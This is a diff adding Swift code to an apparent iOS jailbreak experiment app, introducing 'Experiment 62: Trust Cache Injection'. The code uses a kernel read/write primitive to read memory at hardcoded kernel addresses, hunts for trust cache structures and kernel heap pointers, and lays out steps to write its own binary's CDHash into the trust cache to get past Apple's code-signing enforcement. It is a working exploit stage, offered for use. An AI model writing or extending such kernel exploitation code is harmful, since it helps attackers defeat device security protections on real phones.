@@ -205,6 +205,14 @@ struct AMFIExperimentView: View {
             let exp61 = self.expFinalAssault(rc: rc)
             experimentResults.append(exp61)
             
+            // ============================================
+            // 🔥🔥🔥🔥🔥🔥🔥🔥 Experiment 62: Trust Cache Injection
+            // Found trust cache candidates in __DATA!
+            // Try to READ them via socket KRW → if accessible → INJECT CDHash!
+            // ============================================
+            let exp62 = self.expTrustCacheInjection(rc: rc)
+            experimentResults.append(exp62)
+            
             DispatchQueue.main.async {
                 self.results = experimentResults
                 self.isRunning = false
@@ -1552,6 +1560,206 @@ struct AMFIExperimentView: View {
         detail += anySuccess ? "🔥 Some paths showed promise!\n" : "All paths blocked by AMFI MAC policy\n"
         
         return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥🔥 FINAL ASSAULT", success: anySuccess, detail: detail, timestamp: Date())
+    }
+    
+    // MARK: - 🔥🔥🔥🔥🔥🔥🔥🔥 Experiment 62: Trust Cache Injection
+    
+    /// Experiment 62: Try to READ trust cache candidates from __DATA via socket KRW
+    /// Kernelcache analysis found trust cache structs in __DATA segment.
+    /// If socket KRW can reach them → we can INJECT our CDHash → full jailbreak!
+    ///
+    /// Key addresses (unslid, add kernel_slide):
+    /// - pmap_cs_allow_invalid: 0xfffffff00a0e45b8 (CONFIRMED accessible)
+    /// - Trust cache candidates: 0xfffffff00a0f24b0, 0xfffffff00a0f7148, etc.
+    /// - Mystery value at pmap_cs-48: 0xfffffff00a0e4588 = 0x40000002000
+    ///
+    /// Strategy: try reading FIRST trust cache candidate. If no panic → we're in!
+    /// Then verify it's a real trust cache (version=2, valid CDHashes)
+    /// Then WRITE our binary's CDHash into the entries array!
+    private func expTrustCacheInjection(rc: RemoteCall) -> ExperimentResult {
+        let mgr = dspmgr.shared
+        let slide = mgr.kernslide
+        var detail = "🔥 Trust Cache Injection Attempt\n\n"
+        detail += "Kernel slide: 0x\(String(format: "%llx", slide))\n\n"
+        
+        // Known accessible: pmap_cs_allow_invalid at 0xfffffff00a0e45b8
+        let pmapCSUnslid: UInt64 = 0xfffffff00a0e45b8
+        let pmapCSAddr = pmapCSUnslid + slide
+        
+        // Verify our KRW still works
+        let pmapVal = ds_kread32(pmapCSAddr)
+        detail += "Verify KRW: pmap_cs=\(pmapVal) at 0x\(String(format: "%llx", pmapCSAddr)) ✅\n\n"
+        
+        // ═══════════════════════════════════════════════
+        // TEST 1: Read the mystery value at pmap_cs - 48
+        // In kernelcache this is 0x40000002000 — what is it at runtime?
+        // ═══════════════════════════════════════════════
+        detail += "=== Test 1: pmap_cs neighbors ===\n"
+        let neighborAddr = pmapCSAddr - 48
+        let neighborVal = ds_kread64(neighborAddr)
+        detail += "pmap_cs-48 (0x\(String(format: "%llx", neighborAddr))): 0x\(String(format: "%llx", neighborVal))\n"
+        
+        // Also read pmap_cs-8, -16, +8, +16 (very close = same cache line = safe)
+        let offsets: [Int64] = [-16, -8, 0, 8, 16]
+        for off in offsets {
+            let addr = UInt64(Int64(pmapCSAddr) + off)
+            let val = ds_kread64(addr)
+            if val != 0 || off == 0 {
+                detail += "  pmap_cs\(off >= 0 ? "+" : "")\(off): 0x\(String(format: "%llx", val))\n"
+            }
+        }
+        
+        // ═══════════════════════════════════════════════
+        // TEST 2: Try reading FIRST trust cache candidate
+        // 0xfffffff00a0f24b0 — 128 entries, ~870KB from pmap_cs
+        // This is still in __DATA segment, MIGHT be same zone
+        // ═══════════════════════════════════════════════
+        detail += "\n=== Test 2: Trust Cache candidate read ===\n"
+        
+        // Start with addresses CLOSEST to pmap_cs (most likely same zone)
+        // pmap_cs is at 0xfffffff00a0e45b8
+        // First candidate at 0xfffffff00a0f24b0 (distance: 0xDEF8 = 57080 bytes)
+        
+        // But first — try reading just ONE address slightly further out
+        // to test if the zone extends beyond pmap_cs's immediate area
+        let testAddr1 = pmapCSAddr + 0x1000  // 4KB away (next page)
+        let testVal1 = ds_kread64(testAddr1)
+        detail += "pmap_cs+0x1000: 0x\(String(format: "%llx", testVal1)) "
+        detail += (testVal1 != 0 ? "✅ readable!\n" : "(zero but no panic = readable)\n")
+        
+        let testAddr2 = pmapCSAddr + 0x4000  // 16KB away
+        let testVal2 = ds_kread64(testAddr2)
+        detail += "pmap_cs+0x4000: 0x\(String(format: "%llx", testVal2)) "
+        detail += (testVal2 != 0 ? "✅ readable!\n" : "(zero/readable)\n")
+        
+        let testAddr3 = pmapCSAddr + 0x10000  // 64KB away
+        let testVal3 = ds_kread64(testAddr3)
+        detail += "pmap_cs+0x10000: 0x\(String(format: "%llx", testVal3)) "
+        detail += (testVal3 != 0 ? "✅ readable!\n" : "(zero/readable)\n")
+        
+        // If we get here without panic, try the trust cache candidate!
+        // 0xfffffff00a0f24b0 is at offset +0xDEF8 from pmap_cs
+        let tcCandidateUnslid: UInt64 = 0xfffffff00a0f24b0
+        let tcAddr = tcCandidateUnslid + slide
+        let distFromPmap = tcAddr - pmapCSAddr
+        
+        detail += "\nTrust cache candidate: 0x\(String(format: "%llx", tcAddr))\n"
+        detail += "Distance from pmap_cs: 0x\(String(format: "%llx", distFromPmap)) (\(distFromPmap) bytes)\n"
+        
+        // READ the first 24 bytes (version + uuid + num_entries)
+        let tcVersion = ds_kread32(tcAddr)
+        detail += "Read version field: \(tcVersion)\n"
+        
+        if tcVersion == 2 || tcVersion == 1 {
+            detail += "✅ VERSION MATCHES! This might be a real trust cache!\n\n"
+            
+            // Read UUID (16 bytes)
+            var uuid = [UInt8](repeating: 0, count: 16)
+            for i in 0..<2 {
+                let val = ds_kread64(tcAddr + 4 + UInt64(i * 8))
+                for j in 0..<8 {
+                    uuid[i*8+j] = UInt8((val >> (j*8)) & 0xFF)
+                }
+            }
+            let uuidStr = uuid.map { String(format: "%02x", $0) }.joined()
+            detail += "UUID: \(uuidStr)\n"
+            
+            // Read num_entries
+            let numEntries = ds_kread32(tcAddr + 20)
+            detail += "Num entries: \(numEntries)\n"
+            
+            if numEntries > 0 && numEntries < 50000 {
+                detail += "\n✅✅✅ VALID TRUST CACHE FOUND! ✅✅✅\n"
+                detail += "Version=\(tcVersion), Entries=\(numEntries)\n\n"
+                
+                // Read first CDHash to verify
+                let firstEntry = tcAddr + 24
+                var cdhash = [UInt8](repeating: 0, count: 20)
+                for i in 0..<3 {
+                    let val = ds_kread64(firstEntry + UInt64(i * 8))
+                    for j in 0..<min(8, 20 - i*8) {
+                        cdhash[i*8+j] = UInt8((val >> (j*8)) & 0xFF)
+                    }
+                }
+                let cdhashStr = cdhash.map { String(format: "%02x", $0) }.joined()
+                detail += "First CDHash: \(cdhashStr)\n"
+                
+                let isValidHash = Set(cdhash).count >= 8
+                if isValidHash {
+                    detail += "✅ High entropy — REAL CDHash!\n\n"
+                    detail += "🎉🎉🎉 TRUST CACHE IS ACCESSIBLE VIA SOCKET KRW! 🎉🎉🎉\n\n"
+                    detail += "NEXT STEP: Write our binary's CDHash into this trust cache!\n"
+                    detail += "1. Compute CDHash of our copied binary\n"
+                    detail += "2. Increment num_entries by 1\n"
+                    detail += "3. Write CDHash at entries[num_entries]\n"
+                    detail += "4. Try spawn → FULL JAILBREAK!\n"
+                } else {
+                    detail += "Low entropy — might be structured data, not real CDHash\n"
+                    detail += "Try next candidate...\n"
+                }
+            } else {
+                detail += "num_entries=\(numEntries) — doesn't look like trust cache\n"
+                detail += "Might be coincidental version=2 match\n"
+            }
+        } else {
+            detail += "Version=\(tcVersion) — NOT a trust cache (expected 1 or 2)\n"
+            detail += "This address might contain different data at runtime\n"
+            detail += "(kernelcache values change after boot)\n\n"
+            
+            // Try a few more candidates
+            let moreCandidates: [(String, UInt64)] = [
+                ("0xfffffff00a0f7148", 0xfffffff00a0f7148),
+                ("0xfffffff00a0f8f88", 0xfffffff00a0f8f88),
+                ("0xfffffff00a0fc434", 0xfffffff00a0fc434),
+            ]
+            
+            detail += "Trying more candidates...\n"
+            for (name, unslid) in moreCandidates {
+                let addr = unslid + slide
+                let ver = ds_kread32(addr)
+                let entries = ds_kread32(addr + 20)
+                detail += "  \(name): version=\(ver), entries=\(entries)\n"
+                if ver == 1 || ver == 2 {
+                    if entries > 0 && entries < 50000 {
+                        detail += "    ✅ POSSIBLE TRUST CACHE!\n"
+                    }
+                }
+            }
+        }
+        
+        // ═══════════════════════════════════════════════
+        // TEST 3: Scan for runtime trust cache (dynamically allocated)
+        // At runtime, trust caches are allocated via kalloc
+        // The HEAD pointer might be stored near pmap_cs variables
+        // ═══════════════════════════════════════════════
+        detail += "\n=== Test 3: Runtime trust cache pointers ===\n"
+        
+        // Read values around pmap_cs that look like kernel pointers
+        // These might be trust cache list head or related globals
+        var foundPointers: [(Int64, UInt64)] = []
+        for off in stride(from: Int64(-256), through: Int64(256), by: 8) {
+            let addr = UInt64(Int64(pmapCSAddr) + off)
+            let val = ds_kread64(addr)
+            // Check if it looks like a kernel heap pointer (0xfffffffeXXXXXXXX pattern)
+            if val > 0xfffffffe00000000 && val < 0xffffffffffff0000 {
+                foundPointers.append((off, val))
+            }
+        }
+        
+        if !foundPointers.isEmpty {
+            detail += "Found \(foundPointers.count) kernel heap pointers near pmap_cs!\n"
+            for (off, val) in foundPointers.prefix(10) {
+                detail += "  pmap_cs\(off >= 0 ? "+" : "")\(off): 0x\(String(format: "%llx", val))\n"
+            }
+            detail += "\nThese might point to runtime trust cache modules!\n"
+            detail += "NEXT: dereference each to check struct layout\n"
+        } else {
+            detail += "No kernel heap pointers found near pmap_cs\n"
+            detail += "Trust cache list head might be further away\n"
+        }
+        
+        let success = detail.contains("🎉🎉🎉") || detail.contains("VALID TRUST CACHE") || !foundPointers.isEmpty
+        return ExperimentResult(name: "🔥🔥🔥🔥🔥🔥🔥🔥 Trust Cache", success: success, detail: detail, timestamp: Date())
     }
     
     #endif
